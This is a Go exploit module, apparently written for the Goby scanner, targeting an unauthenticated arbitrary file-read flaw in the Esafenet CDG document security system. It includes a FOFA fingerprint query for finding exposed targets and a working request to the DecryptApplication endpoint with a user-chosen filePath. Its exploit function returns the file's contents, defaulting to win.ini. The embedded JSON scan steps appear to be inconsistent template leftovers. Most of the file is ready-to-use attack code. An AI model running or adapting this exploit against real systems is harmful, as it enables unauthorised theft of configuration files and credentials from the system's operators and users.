package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Esafenet CDG /CDGServer3/client/;login;/DecryptApplication File Read Vulnerability",
    "Description": "<p>The new generation of electronic document security management system (CDG) is a comprehensive data security product that integrates document encryption, data classification and grading, access control, correlation analysis, big data analysis, intelligent identification and other core technologies. </p><p>There is a file reading vulnerability in the DecryptApplication path, which can be exploited by an unauthenticated attacker to obtain sensitive file information within the system. </p>",
    "Product": "ESAFENET-CDG",
    "Homepage": "http://www.esafenet.com/product/277483397",
    "DisclosureDate": "2024-03-14",
    "PostTime": "2024-08-06",
    "Author": "zhangjingpei@baimaohui.net",
    "FofaQuery": "body=\"/CDGServer3/index.jsp\" && body=\"/CDGServer3/SysConfig.jsp\" && title==\"电子文档安全管理系统\"",
    "GobyQuery": "body=\"/CDGServer3/index.jsp\" && body=\"/CDGServer3/SysConfig.jsp\" && title==\"电子文档安全管理系统\"",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>please pay attention to themanufacturer's homepage update.</p><p>If not necessary, prohibit public network access to the system</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "C:///Windows/win.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "501",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "501",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "2H1W"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.3",
    "Translation": {
        "CN": {
            "Name": "亿赛通电子文档安全管理系统 /CDGServer3/client/;login;/DecryptApplication 文件读取漏洞",
            "Product": "亿赛通-电子文档安全管理系统",
            "Description": "<p>亿赛通新一代电子文档安全管理系统（简称：CDG）是一款融合文档加密、数据分类分级、访问控制、关联分析、大数据分析、智能识别等核心技术的综合性数据智能安全产品。<br></p><p>DecryptApplication 路径存在文件读取漏洞，未经身份验证的攻击者利用此漏洞获取系统内部敏感文件信息。<br></p>",
            "Recommendation": "<p>请用户联系⼚商修复漏洞。如非必要，禁止公网访问该系统<br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Esafenet CDG /CDGServer3/client/;login;/DecryptApplication File Read Vulnerability",
            "Product": "ESAFENET-CDG",
            "Description": "<p>The new generation of electronic document security management system (CDG) is a comprehensive data security product that integrates document encryption, data classification and grading, access control, correlation analysis, big data analysis, intelligent identification and other core technologies.&nbsp;</p><p>There is a file reading vulnerability in the DecryptApplication path, which can be exploited by an unauthenticated attacker to obtain sensitive file information within the system.&nbsp;<br></p>",
            "Recommendation": "<p>please pay attention to themanufacturer's homepage update.</p><p>If not necessary, prohibit public network access to the system<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9924"
}`

	sendInitialPayload_PCU84IA := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {

		//发送get请求
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		path := "/CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=" + fileUrl + "&uploadFileId=1&fileName1=ox9wcxwck7g1"
		resp, err := setGetRequest(hostInfo, path, map[string]string{})

		if err != nil {
			return "", err
		}
		// if !strings.Contains(resp.RawBody, "<pre>") {
		// 	return "", fmt.Errorf("no <pre> tags found in response body")
		// }

		// re := regexp.MustCompile(`<pre>A block must be in the form of a dictionary.([\s\S]*)\.\.\.\s*</pre>`)
		// if !re.MatchString(resp.RawBody) {
		// 	return "", fmt.Errorf("no <pre> tags found in response body")
		// }
		// matches := re.FindStringSubmatch(resp.RawBody)[1]
		matches := resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return matches, nil

	}

	ExpManager.AddExploit(NewExploit(

		goutils.GetFileName(),

		expJson,

		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 此处需要修改：设置成功后的vulurl

			vulURL := "/CDGServer3/client/;login;/DecryptApplication"

			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件

			defaultModeMap := map[string]string{

				"C:///Windows/win.ini": "mci",
			}

			// 函数继承

			uploadFileFunc := sendInitialPayload_PCU84IA

			// 请注意：后续代码为模板代码，非特殊情况，无需更改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			for fileUrl, fileText := range defaultModeMap {

				resp, err := uploadFileFunc(u, fileUrl)

				if err != nil {

					continue

				}

				if strings.Contains(resp, fileText) {

					// 设置VULURL

					ss.VulURL = u.HostInfo + vulURL

					return true

				}

			}

			return false

		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			var fileUrl string

			var fileText string

			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件

			defaultModeMap := map[string][2]string{

				"win.ini": {"C:///Windows/win.ini", "mci"},
			}

			// 此处需要修改：函数继承

			uploadFileFunc := sendInitialPayload_PCU84IA

			// 请注意，后续代码为模板固化，正常情况下均无需修改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			if mode == "Customize" {

				fileUrl = goutils.B2S(ss.Params["Customize"])

			} else {

				if _, ok := defaultModeMap[mode]; ok {

					fileUrl = defaultModeMap[mode][0]

					fileText = defaultModeMap[mode][1]

				} else {

					expResult.Success = false

					return expResult

				}

			}

			// 获取返回结果url和返回请求头

			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)

			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {

				expResult.Success = false

				return expResult

			}

			expResult.Success = true

			expResult.Output = resp

			return expResult

		},
	))

}
